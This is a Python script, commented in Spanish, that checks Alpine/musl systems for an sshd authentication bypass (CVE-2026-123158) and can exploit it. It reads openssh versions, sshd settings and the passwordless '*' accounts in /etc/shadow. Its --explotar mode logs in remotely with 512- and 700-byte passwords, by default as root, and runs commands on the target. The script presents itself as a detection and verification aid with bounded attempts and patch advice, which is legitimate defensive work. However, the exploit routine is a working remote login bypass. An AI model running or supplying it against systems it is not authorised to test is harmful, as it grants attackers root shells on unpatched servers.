#!/usr/bin/env python3
"""*sshole (CVE-2026-123158) — bypass de autenticación en sshd sobre musl.

Causa raíz (Cycode/Orca, 2026-11-05): musl libc hace que crypt() devuelva
la cadena "*" cuando falla (desde 2012), y sus SHA-256/512-crypt rechazan
contraseñas de más de 256 bytes. Las cuentas SIN contraseña (root en
Alpine 3.16+, usuarios key-only, el usuario "alpine" de las imágenes
cloud) guardan "*" en shadow. Cuando sshd comprueba la contraseña EL
SIN PAM (por defecto en openssh-server de Alpine), una contraseña de
257-1024 bytes hace fallar crypt(), que devuelve "*", que COINCIDE con el
campo almacenado: login aceptado. glibc (Debian/Ubuntu/Fedora), sshd con
PAM y Dropbear NO están afectados.

Comprobación local:  --sistema
Comprobación remota: --host H [--puerto 22] [--usuario root]
Explotación:         --host H --explotar [--usuario U]  (login con
                     contraseña de 512 bytes; acotado a 2 intentos)
"""
import argparse
import os
import re
import subprocess
import socket
import sys
import time

# rama Alpine -> version openssh del fix (tabla de Cycode 2026-11-05)
FIJOS = {
    "edge": "10.6_p2-r0", "3.24": "10.3_p1-r2", "3.23": "10.2_p1-r1",
    "3.22": "10.0_p1-r11", "3.21": "9.9_p2-r1", "3.20": "9.7_p1-r6",
    "3.19": "9.6_p1-r3", "3.18": "9.3_p2-r4", "3.17": "9.1_p1-r7",
    "3.16": "9.0_p1-r6",
}
CONTRA_LARGA = "k" * 512   # dentro de la ventana 257-1024


def _sh(cmd, timeout=20, env=None):
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout,
                       env=env, check=False)
    return p.returncode, (p.stdout or "") + (p.stderr or "")


def _rama_alpine():
    try:
        v = open("/etc/alpine-release").read().strip()
        return v
    except OSError:
        return None


def check_sistema(seco):
    if seco:
        print("Plan: leer /etc/alpine-release, musl vs glibc, version de "
              "openssh contra la tabla de fixes, sshd -T (needs root) y "
              "cuentas '*' de shadow (needs root); sin tocar el servicio")
        return 0
    rama = _rama_alpine()
    if rama is None:
        rc, out = _sh(["ldd", "--version"])
        if "musl" in out.lower():
            print("VEREDICTO: MUSL_NO_ALPINE — libc musl sin "
                  "/etc/alpine-release (OpenWrt/Buildroot/Yocto?): el "
                  "mismo fallo de crypt() aplica; comprueba sshd a mano "
                  "(PasswordAuthentication sin PAM + cuentas '*')")
            return 3
        print("VEREDICTO: NO_AFECTADO — glibc (musl es el requisito del "
              "bug); crypt() de glibc no devuelve '*' al rechazar la "
              "contraseña larga")
        return 1
    rama_corta = ".".join(rama.split(".")[:2])
    fijo = FIJOS.get(rama_corta)
    rc, out = _sh(["ssh", "-V"])
    m = re.search(r"OpenSSH_(\d+\.\d+)p(\d+)", out)
    instalado = m.group(0)[7:] if m else "(?) " + out.strip()[:60]
    rc2, apk = _sh(["apk", "info", "-e", "openssh"])
    pkg = apk.strip() or "(apk info falló; ¿root?)"
    print(f"[i] Alpine {rama} (rama {rama_corta}); ssh -V: {instalado}; "
          f"paquete: {pkg}")
    fix_txt = fijo or "rama sin rama conocida: actualiza a lo último edge"
    print(f"[i] fix de la rama: {fix_txt}")
    expuesto = []
    rc3, cfg = _sh(["sh", "-c", "sshd -T 2>/dev/null | grep -iE "
                    "'passwordauthentication|usepam'"])
    if rc3 == 0 and cfg.strip():
        for linea in cfg.strip().splitlines():
            print(f"[i] sshd -T: {linea}")
        if re.search(r"passwordauthentication yes", cfg, re.I):
            expuesto.append("PasswordAuthentication sí")
        if re.search(r"usepam no", cfg, re.I):
            expuesto.append("UsePAM no (sshd comprueba solo)")
    else:
        print("[i] sshd -T sin datos (ejecuta con sudo para ver "
              "PasswordAuthentication/UsePAM)")
    rc4, shadow = _sh(["sh", "-c",
                       "awk -F: '$2==\"*\"{print $1}' /etc/shadow 2>/dev/null"])
    if rc4 == 0 and shadow.strip():
        cuentas = shadow.split()
        print(f"[i] cuentas con campo '*' en shadow (sin contraseña): "
              f"{', '.join(cuentas[:12])}")
        expuesto.append(f"{len(cuentas)} cuentas '*'")
    elif rc4 != 0:
        print("[i] /etc/shadow sin leer (sudo para ver cuentas '*')")
    rc5, _ = _sh(["pgrep", "-x", "sshd"])
    if rc5 != 0:
        print("[i] sshd no está en ejecución en esta máquina")
        return 1
    if fijo and "sin rama" not in str(fijo):
        print(f"ACCIÓN: actualiza con `apk upgrade -U -a` y "
              f"`rc-service sshd restart` (el binario nuevo no sustituye "
              f"al demonio en ejecución); objetivo: openssh >= {fijo}")
    tiene_pam_no = any("UsePAM" in e for e in expuesto)
    if tiene_pam_no and len(expuesto) >= 2:
        print("VEREDICTO: EXPUESTO — " + " + ".join(expuesto) +
              " sobre musl: prueba la explotación contra ti mismo "
              "(--host 127.0.0.1 --explotar --usuario <cuenta '*'>)")
        return 0
    if any("PasswordAuthentication" in e for e in expuesto) and \
            not tiene_pam_no:
        print("[i] PasswordAuthentication sí pero sin confirmación de "
              "UsePAM no: con PAM activo el vector está cerrado")
    print("VEREDICTO: INCONCLUYENTE — faltan datos (sshd -T / shadow "
          "requieren sudo); con ambos factores confirmados es EXPUESTO")
    return 3


def _banner(host, puerto):
    try:
        s = socket.create_connection((host, puerto), timeout=8)
        s.settimeout(8)
        data = b""
        while not data.endswith(b"\n"):
            chunk = s.recv(256)
            if not chunk:
                break
            data += chunk
        s.close()
        return data.decode("utf-8", "replace").strip()
    except OSError as e:
        return None


def check_host(host, puerto, usuario, seco):
    if seco:
        print(f"Plan: banner TCP de {host}:{puerto} + métodos de auth que "
              f"ofrece para '{usuario}' (NumberOfPasswordPrompts=0, no "
              "llega a loguear); heurístico — el backport de Alpine no se "
              "ve en el banner")
        return 0
    b = _banner(host, puerto)
    if b is None:
        print(f"INCONCLUYENTE: {host}:{puerto} no responde al banner TCP")
        return 3
    print(f"[i] banner: {b}")
    es_openssh = re.search(r"OpenSSH_", b)
    alpine_hint = "alpine" in b.lower() or "linux" in b.lower()
    rc, out = _sh(["ssh", "-o", "PreferredAuthentications=password",
                   "-o", "PubkeyAuthentication=no", "-o", "BatchMode=yes",
                   "-o", "NumberOfPasswordPrompts=0",
                   "-o", "StrictHostKeyChecking=accept-new",
                   "-o", "ConnectTimeout=8", "-p", str(puerto),
                   f"{usuario}@{host}", "true"])
    ofrece = re.search(r"Permission denied \(([^)]*)\)", out)
    metodos = ofrece.group(1) if ofrece else "(sin lista)"
    print(f"[i] métodos de auth ofrecidos a '{usuario}': {metodos}")
    if not es_openssh:
        print("VEREDICTO: NO_ES_OPENSSH — otro servidor (Dropbear u otro) "
              "no comparte este fallo de musl-crypt")
        return 1
    if "password" not in metodos and "keyboard" not in metodos:
        print("VEREDICTO: SIN_AUTH_POR_CONTRASEÑA — PasswordAuthentication "
              "apagado o cuenta no apta: el vector está cerrado")
        return 1
    print("VEREDICTO: CANDIDATO — sshd con auth por contraseña a la vista. "
          "La versión del banner no distingue el backport de Alpine; "
          "confirma con --explotar (login con contraseña de 512 bytes) o "
          "con `sshd -T` en el propio host")
    return 3


def explotar(host, puerto, usuario, seco):
    if seco:
        print(f"Plan: 2 intentos de login como '{usuario}' en "
              f"{host}:{puerto} con contraseña de 512 y 700 bytes "
              "(ventana 257-1024 del bug), solo password-auth, comando "
              "inofensivo id;hostname. Deja 'Accepted password' en el log "
              "del objetivo si entra: eso ES el IOC buscado")
        return 0
    entorno = dict(os.environ, SSHPASS=CONTRA_LARGA)
    for n, contra in ((1, "k" * 512), (2, "k" * 700)):
        entorno["SSHPASS"] = contra
        rc, out = _sh(["sshpass", "-e", "ssh",
                       "-o", "PreferredAuthentications=password",
                       "-o", "PubkeyAuthentication=no",
                       "-o", "KbdInteractiveAuthentication=no",
                       "-o", "NumberOfPasswordPrompts=1",
                       "-o", "StrictHostKeyChecking=accept-new",
                       "-o", "ConnectTimeout=10",
                       "-p", str(puerto), f"{usuario}@{host}",
                       "id; hostname; cat /etc/alpine-release 2>/dev/null"],
                      timeout=30, env=entorno)
        if rc == 0 and "uid=" in out:
            print(f"[i] intento {n} (contraseña de {len(contra)} bytes): "
                  "LOGIN ACEPTADO")
            for linea in out.strip().splitlines():
                print(f"    {linea}")
            print("VEREDICTO: BYPASS_CONFIRMADO — login con contraseña "
                  "larga en cuenta que no tiene contraseña "
                  "(CVE-2026-123158). Trata el host como comprometido: "
                  "rota claves, revisa `Accepted password for` en los "
                  "logs y actualiza openssh (apk upgrade + restart de "
                  "sshd).")
            return 0
        if "Permission denied" in out or "denied" in out.lower():
            print(f"[i] intento {n}: denegado")
        else:
            print(f"[i] intento {n}: sin login (rc={rc}) — "
                  + out.strip().splitlines()[-1][:100] if out.strip()
                  else f"[i] intento {n}: sin login (rc={rc})")
        time.sleep(3)
    print("VEREDICTO: BYPASS_NO_CONFIRMADO — o el host está parcheado, o "
          "es glibc/PAM, o la cuenta sí tiene contraseña, o "
          "PasswordAuthentication está apagado; desde fuera no se "
          "distingue. Prueba con otra cuenta (root en Alpine 3.16+, "
          "usuario 'alpine', deploy users)")
    return 3


def main(argv=None):
    ap = argparse.ArgumentParser(prog="extras_sshole.py")
    sub = ap.add_subparsers(dest="modo", required=True)
    s = sub.add_parser("sshole")
    s.add_argument("--sistema", action="store_true",
                   help="comprobar esta máquina")
    s.add_argument("--host", help="comprobar/explotar host SSH remoto")
    s.add_argument("--puerto", type=int, default=22)
    s.add_argument("--usuario", default="root")
    s.add_argument("--explotar", action="store_true",
                   help="con --host: intentar el login con contraseña "
                        "larga (2 intentos acotados)")
    s.add_argument("--dry-run", action="store_true")
    a = ap.parse_args(argv)
    if not (a.sistema or a.host):
        print("Error: indica --sistema y/o --host", file=sys.stderr)
        return 2
    resultados = []
    if a.sistema:
        resultados.append(check_sistema(a.dry_run))
    if a.host:
        if a.explotar:
            resultados.append(explotar(a.host, a.puerto, a.usuario,
                                       a.dry_run))
        else:
            resultados.append(check_host(a.host, a.puerto, a.usuario,
                                         a.dry_run))
    for prioridad in (0, 3):
        if prioridad in resultados:
            return prioridad
    return 1


if __name__ == "__main__":
    sys.exit(main())
